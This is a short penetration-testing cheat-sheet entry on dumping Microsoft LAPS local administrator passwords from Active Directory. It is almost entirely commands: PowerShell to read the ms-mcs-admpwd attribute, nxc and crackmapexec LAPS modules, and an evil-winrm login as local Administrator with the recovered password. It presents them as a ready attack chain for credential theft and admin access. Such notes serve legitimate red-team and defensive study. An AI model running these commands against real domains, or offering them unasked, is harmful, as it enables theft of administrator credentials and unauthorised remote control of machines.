# LAPS Password Read

LAPS (Local Administrator Password Solution) stores rotating local admin passwords in `ms-mcs-admpwd` on each computer object. Any account in the `LAPS_Readers` group (or with `ReadProperty` on that attribute) can dump them.

**Check membership / attribute access:**
```powershell
Get-ADComputer <COMPUTERNAME> -property 'ms-mcs-admpwd'
# Output: ms-mcs-admpwd : <plaintext password>
```

**From Linux with nxc:**
```bash
nxc ldap <DC> -u <USER> -p '<PASS>' -M laps
nxc smb <TARGET> -u <USER> -p '<PASS>' --laps
```

**From Linux with crackmapexec:**
```bash
crackmapexec ldap <DC> -u <USER> -p '<PASS>' --module laps
```

After reading the password, authenticate as local Administrator:
```bash
evil-winrm -i <TARGET> -u administrator -p '<LAPS_PASSWORD>'
```
